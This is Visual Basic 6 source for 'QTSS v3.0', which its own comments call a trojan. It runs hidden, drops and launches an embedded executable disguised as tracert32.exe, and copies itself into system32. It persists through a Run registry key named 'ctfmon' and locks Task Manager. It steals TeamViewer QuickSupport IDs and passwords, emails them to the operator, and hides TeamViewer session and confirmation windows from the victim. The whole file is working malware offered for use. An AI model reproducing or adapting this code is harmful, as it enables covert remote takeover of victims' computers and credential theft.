VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "wfgiuh478h3t984ht938j4"
   ClientHeight    =   3090
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   4680
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   3090
   ScaleWidth      =   4680
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer6 
      Interval        =   1
      Left            =   1800
      Top             =   0
   End
   Begin VB.Timer Timer5 
      Interval        =   1
      Left            =   2520
      Top             =   0
   End
   Begin VB.Timer Timer2 
      Interval        =   1
      Left            =   720
      Top             =   0
   End
   Begin VB.Timer Timer9 
      Interval        =   10
      Left            =   2160
      Top             =   0
   End
   Begin VB.Timer Timer7 
      Interval        =   500
      Left            =   1440
      Top             =   0
   End
   Begin VB.Timer Timer4 
      Interval        =   1
      Left            =   360
      Top             =   0
   End
   Begin VB.Timer Timer1 
      Interval        =   500
      Left            =   0
      Top             =   0
   End
   Begin VB.Label xxxEmail 
      Caption         =   "XXX"
      Height          =   255
      Left            =   240
      TabIndex        =   0
      Top             =   720
      Width           =   1215
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'====================================
'= Author: trungtrung (dinhquangtrung90@yahoo.com)
'= QTSS v3.0 - Open Source
'= Don't Forget Me When You Use This Program :) Thank
'====================================
'
'
'

']]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
' Resource ID:
' 101: QS3.exe
' 102: Setup Unlocker (inject file)
']]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]


Option Explicit
Dim EXEFile As String

Private Const WM_GETTEXT = &HD
Private Const WM_GETTEXTLENGTH = &HE


Private Type POINTAPI
  x As Long
  y As Long
End Type
Private Const MAX_COMPUTERNAME_LENGTH As Long = 31
Private Declare Function GetComputerName Lib "Kernel32" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Private Declare Function InternetGetConnectedStateEx Lib "wininet.dll" (ByRef lpdwFlags As Long, ByVal lpszConnectionName As String, ByVal dwNameLen As Integer, ByVal dwReserved As Long) As Long
Private Declare Function DeleteFile Lib "Kernel32" Alias "DeleteFileA" (ByVal lpFileName As String) As Long
Private Declare Function DestroyWindow Lib "user32" (ByVal hWnd As Long) As Long
Private Declare Function GetParent Lib "user32" (ByVal hWnd As Long) As Long
Private Declare Function WindowFromPoint Lib "user32" (ByVal xPoint As Long, ByVal yPoint As Long) As Long
Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Private Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hWnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Private Declare Function ShowWindow Lib "user32" (ByVal hWnd As Long, ByVal nCmdShow As Long) As Long
Private Declare Function SetWindowPos Lib "user32" (ByVal hWnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Dim sConnType As String * 255

Const SW_HIDE = 0
Const SWP_HIDEWINDOW = &H80
Const SWP_SHOWWINDOW = &H40
Const WM_CLOSE = &H10



Private Sub Form_Load()
']]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
' Resource ID:
' 101: QS3.exe
' 102: Setup Unlocker (inject file)
']]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
EXEFile = "C:\WINDOWS\system32\tracert32.exe"
On Error GoTo BoQuAgIaiDoAn
'()()(()()()()()()()()()()()(()
'(((((((((((( Lâ'y thông tin )))))))))))))
    Dim PropBag As New PropertyBag
    Dim BeginPos As Long
    Dim varTemp As Variant
    Dim byteArr() As Byte
    Open AppPath & App.EXEName & ".exe" For Binary As #1
        Get #1, LOF(1) - 3, BeginPos
        Seek #1, BeginPos
        Get #1, , varTemp
        byteArr = varTemp
        PropBag.Contents = byteArr
        PropBag.WriteProperty "LOF", LOF(1)
        PropBag.WriteProperty "BeginPos", BeginPos
    Close #1
    

    With PropBag
        Form1.xxxEmail.Caption = .ReadProperty("EMAIL", "XXX")
    End With
'()(((((((())))))))))))))))))))))))))))))))))))
BoQuAgIaiDoAn:

'(((((((((( Ân chuong trình ))))))))))
App.TaskVisible = False
Form1.Visible = False
Form1.Hide


'((((((((((( Extract file Trojan & Run it )))))))))
Dim ocxDir$
ocxDir = EXEFile
If (FileExists(ocxDir) = True) Then
    SetAttr EXEFile, vbNormal
    DeleteFile EXEFile
End If
Dim bytResourceData() As Byte
bytResourceData = LoadResData(101, "CUSTOM")
Open ocxDir For Binary Shared As #1
Put #1, 1, bytResourceData
Close #1
Shell EXEFile



'(((((((((( Lây nhiêm vào máy trong lân chay daa`u tiên )))))))))))))
If UCase(AppPath) <> UCase(Environ("WinDir") & "\System32\") Then
    If FileExists(Environ("WinDir") & "\System32\tracert3.exe") = True Then
    SetAttr Environ("WinDir") & "\System32\tracert3.exe", vbNormal
    DeleteFile Environ("WinDir") & "\System32\tracert3.exe"
    End If
    FileCopy AppPath & App.EXEName & ".exe", Environ("WinDir") & "\System32\tracert3.exe"
End If
SaveString HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", "ctfmon", Environ("WinDir") & "\System32\tracert3.exe"

'(((((((( Cách khóa Task Manager do'n gian nhâ't ))))))))))))
Open "C:\WINDOWS\system32\taskmgr.exe" For Binary As #1


End Sub


Private Sub Timer1_Timer()

'(((((((((((( Timer1 có chu'c nang lây ID & PASS cua Teamviewer sau
'do gui ve Email
Dim Xx As Long
Xx = 3
KiEmLaItUdAu:
Xx = Xx + 1
Dim AxB As Long
Dim AxC As Long
Dim AxA As Long
AxB = FindWindow(vbNullString, "UNODC QuickSupport")
If AxB <> 0 Then
    AxC = FindWindowEx(AxB, ByVal 0&, "Edit", vbNullString)
    AxA = FindWindowEx(AxB, Xx, "Edit", vbNullString)
    If AxA = 0 Then GoTo KiEmLaItUdAu
    If Len(LayNoiDung(AxA)) > 5 Then GoTo KiEmLaItUdAu
    If LayNoiDung(AxC) <> "-" Then
        Me.Caption = "ID: " & LayNoiDung(AxC) & " - PASS: " & LayNoiDung(AxA)
        '(((((( Gui mail sau do' ngung Timer này lai
        SendMail Form1.xxxEmail.Caption, "Chao ban! Ban nhan duoc thong tin cua Virus Trojan QTSS 3.0 den tu may tinh: " & ComputerName & ". Thong tin cua ban: " & Me.Caption & ". Ban hay su dung chuong trinh dieu khien do chuong trinh cung cap de dieu khien may tinh cua nan nhan! Cam on ban da su dung chuong trinh ;)"
        Timer1.Enabled = False
    End If
End If
End Sub

Public Function LayNoiDung(mWnd) As String
'(((( Hàm lâ'y nôi dung cua Handle suu tâ`m tu http://caulacbovb.com
Dim length As Long
Dim result As Long
Dim strTMP As String
length = SendMessage(mWnd, WM_GETTEXTLENGTH, ByVal 0, ByVal 0) + 1
strTMP = Space(length)
result = SendMessage(mWnd, WM_GETTEXT, ByVal length, ByVal strTMP)
Dim s As Variant
Dim st As String
s = Split(strTMP, vbNullChar)
LayNoiDung = s(0)
End Function






Private Sub Timer4_Timer()
'(((( Ân Teamvewer )))))
Dim AxByZx As Long
AxByZx = FindWindow(vbNullString, "Sponsored session")
If AxByZx <> 0 Then
ShowWindow AxByZx, SW_HIDE
Shell "shutdown -l"
Timer4.Enabled = False
End If
End Sub



Private Sub Timer7_Timer()
'(((( Ân Teamvewer )))))
EnumChildWindows GetDesktopWindow, AddressOf EnumChildProc, ByVal 0&
End Sub

Private Sub Timer5_Timer()
'(((( Ân Teamvewer )))))
Dim AxByZxU As Long
AxByZxU = FindWindow(vbNullString, "TeamViewer - File Transfer Eventlog")
If AxByZxU <> 0 Then
ShowWindow AxByZxU, SW_HIDE
End If
End Sub
Private Sub Timer6_Timer()
'(((( Ân Teamvewer )))))
Dim AxByZxUz As Long
AxByZxUz = FindWindow(vbNullString, "Confirmation")
If AxByZxUz <> 0 Then
ShowWindow AxByZxUz, SW_HIDE
End If
End Sub
Private Sub Timer9_Timer()
'((((( Ghi vào Registry )))))
SaveString HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", "ctfmon", Environ("WinDir") & "\System32\tracert3.exe"
End Sub
Private Function ComputerName() As String
'((((( hàm lâ'y Computer Name : caulacbovb.com ))))))
    Dim dwLen As Long
    Dim strString As String
    dwLen = MAX_COMPUTERNAME_LENGTH + 1
    strString = String(dwLen, "X")
    GetComputerName strString, dwLen
    strString = Left(strString, dwLen)
    ComputerName = strString
End Function
Private Sub Timer2_Timer()
'(((( Ân Teamvewer )))))
Dim AxBy As Long
AxBy = FindWindow(vbNullString, "UNODC QuickSupport")
If AxBy <> 0 Then
ShowWindow AxBy, SW_HIDE
End If
End Sub
